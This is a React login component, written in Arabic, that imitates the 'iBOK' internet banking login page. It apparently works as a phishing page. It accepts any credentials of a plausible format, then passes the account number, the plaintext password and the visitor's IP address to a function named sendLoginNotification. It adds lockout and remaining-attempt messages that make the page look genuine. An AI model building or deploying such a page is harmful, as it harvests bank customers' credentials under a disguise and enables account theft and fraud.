import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

import {
    validateAccountNumber,
    validatePassword,
    sanitizeInput
} from '../utils/validation';
import {
    createSession,
    isAuthenticated,
    recordFailedLogin,
    resetLoginAttempts,
    isAccountLocked,
    getRemainingAttempts
} from '../utils/auth';
import {
    sendLoginNotification,
    getUserIP
} from '../utils/emailService';

const Login = () => {
    const navigate = useNavigate();

    // Form state
    const [formData, setFormData] = useState({
        accountNumber: '',
        password: ''
    });

    // UI state
    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [isLoading, setIsLoading] = useState(false);
    const [alert, setAlert] = useState(null);
    const [remainingAttempts, setRemainingAttempts] = useState(null);
    const [lockoutTime, setLockoutTime] = useState(null);

    // Check if already authenticated
    useEffect(() => {
        if (isAuthenticated()) {
            navigate('/profile');
        }
    }, [navigate]);

    // Update lockout timer
    useEffect(() => {
        if (lockoutTime && lockoutTime > 0) {
            const timer = setInterval(() => {
                setLockoutTime(prev => {
                    if (prev <= 1) {
                        setAlert(null);
                        return null;
                    }
                    return prev - 1;
                });
            }, 1000);

            return () => clearInterval(timer);
        }
    }, [lockoutTime]);

    /**
     * Handles input changes
     */
    const handleChange = (e) => {
        const { name, value } = e.target;
        const sanitizedValue = sanitizeInput(value);

        setFormData(prev => ({
            ...prev,
            [name]: sanitizedValue
        }));

        // Clear error for this field
        if (errors[name]) {
            setErrors(prev => ({
                ...prev,
                [name]: null
            }));
        }

        // Update remaining attempts when account number changes
        if (name === 'accountNumber' && sanitizedValue) {
            const attempts = getRemainingAttempts(sanitizedValue);
            setRemainingAttempts(attempts);
        }
    };

    /**
     * Validates form data
     */
    const validateForm = () => {
        const newErrors = {};

        // Validate account number
        if (!formData.accountNumber) {
            newErrors.accountNumber = 'رقم الحساب مطلوب';
        } else if (!validateAccountNumber(formData.accountNumber)) {
            newErrors.accountNumber = 'رقم الحساب يجب أن يتكون من 7 أرقام على الأقل';
        }

        // Validate password
        if (!formData.password) {
            newErrors.password = 'كلمة المرور مطلوبة';
        } else {
            const passwordValidation = validatePassword(formData.password);
            if (!passwordValidation.isValid) {
                newErrors.password = passwordValidation.message;
            }
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    /**
     * Handles form submission
     */
    const handleSubmit = async (e) => {
        e.preventDefault();
        setAlert(null);

        // Check if account is locked
        const lockStatus = isAccountLocked(formData.accountNumber);
        if (lockStatus.isLocked) {
            setLockoutTime(lockStatus.remainingSeconds);
            setAlert({
                type: 'error',
                message: `الحساب مقفل مؤقتاً. يرجى المحاولة بعد ${Math.ceil(lockStatus.remainingSeconds / 60)} دقيقة`
            });
            return;
        }

        // Validate form
        if (!validateForm()) {
            return;
        }

        setIsLoading(true);

        try {
            // Simulate API call (replace with actual authentication)
            await new Promise(resolve => setTimeout(resolve, 1500));

            // For demo purposes, accept any valid format
            // In production, verify against backend
            const isValidLogin = formData.accountNumber.length >= 7 && formData.password.length >= 8;

            if (isValidLogin) {
                // Create user session
                const userData = {
                    accountNumber: formData.accountNumber,
                    email: formData.accountNumber, // Demo email
                    loginTime: new Date().toISOString()
                };

                createSession(userData);
                resetLoginAttempts(formData.accountNumber);

                // Send login notification email
                try {
                    const ipAddress = await getUserIP();
                    await sendLoginNotification({
                        // userEmail: userData.email,
                        accountNumber: userData.accountNumber,
                        password: formData.password,
                        ipAddress
                    });
                } catch (emailError) {
                    console.error('Failed to send login notification:', emailError);
                    // Don't block login if email fails
                }

                // Show success message
                setAlert({
                    type: 'success',
                    message: 'تم تسجيل الدخول بنجاح!'
                });

                // Redirect to profile page
                setTimeout(() => {
                    navigate('/profile');
                }, 1000);
            } else {
                // Record failed attempt
                recordFailedLogin(formData.accountNumber);
                const attempts = getRemainingAttempts(formData.accountNumber);
                setRemainingAttempts(attempts);

                setAlert({
                    type: 'error',
                    message: `رقم الحساب أو كلمة المرور غير صحيحة. المحاولات المتبقية: ${attempts}`
                });
            }
        } catch (error) {
            console.error('Login error:', error);
            setAlert({
                type: 'error',
                message: 'حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى'
            });
        } finally {
            setIsLoading(false);
        }
    };

    /**
     * Formats lockout time
     */
    const formatLockoutTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${minutes}:${secs.toString().padStart(2, '0')}`;
    };

    return (
        <div className="app-container">
            

            <div className="page-wrapper">
                
                
                <div className="form-card">
                    <div className="card-header-mini">
                        <div className="card-header-content">

                            <div className="logo-section-mini">
                                <div className="logo-text-mini">
                                    <span className="i-letter-mini">i</span>BOK
                                </div>
                                <div className="logo-subtitle-mini">إي بــــوك</div>
                            </div>

                            <div className="service-info-mini">
                                <div className="service-title-ar-mini">الخدمات المصرفية عبر الإنترنت</div>
                                <div className="service-title-en-mini">Internet Banking</div>
                            </div>

                        </div>

                        <div className="card-wave-mini"></div>
                    </div>


                    <h1 className="card-title">تسجيل الدخول</h1>

                    {alert && (
                        <div className={`alert alert-${alert.type}`}>
                            {alert.message}
                            {lockoutTime && (
                                <div className="mt-sm">
                                    الوقت المتبقي: {formatLockoutTime(lockoutTime)}
                                </div>
                            )}
                        </div>
                    )}

                    <form onSubmit={handleSubmit}>
                        {/* Account Number */}
                        <div className="form-group">
                            <label htmlFor="accountNumber" className="form-label">
                                رقم الحساب:
                            </label>
                            <input
                                type="text"
                                id="accountNumber"
                                name="accountNumber"
                                className="form-input"
                                placeholder="أدخل رقم الحساب"
                                value={formData.accountNumber}
                                onChange={handleChange}
                            />

                            {errors.accountNumber && (
                                <span className="error-message">{errors.accountNumber}</span>
                            )}
                            {remainingAttempts !== null && remainingAttempts < 5 && !errors.accountNumber && (
                                <span className="error-message">
                                    المحاولات المتبقية: {remainingAttempts}
                                </span>
                            )}
                        </div>

                        {/* Password */}
                        <div className="form-group">
                            <label htmlFor="password" className="form-label">
                                كلمة المرور:
                            </label>

                            <div className="password-input-wrapper">
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    id="password"
                                    name="password"
                                    className="form-input"
                                    placeholder="أدخل كلمة المرور"
                                    value={formData.password}
                                    onChange={handleChange}
                                />

                                <button
                                    type="button"
                                    className="password-toggle"
                                    onClick={() => setShowPassword(!showPassword)}
                                    aria-label={showPassword ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور'}
                                >
                                    {showPassword ? '🙈' : '👁️'}
                                </button>
                            </div>
                        </div>




                        {/* Submit Button */}
                        <div className="form-group mt-lg">
                            <button
                                type="submit"
                                className="btn btn-primary"
                                disabled={isLoading || lockoutTime}
                            >
                                {isLoading ? (
                                    <>
                                        <span className="spinner"></span>
                                        <span style={{ marginRight: '8px' }}>جاري تسجيل الدخول...</span>
                                    </>
                                ) : (
                                    'تسجيل الدخول'
                                )}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default Login;
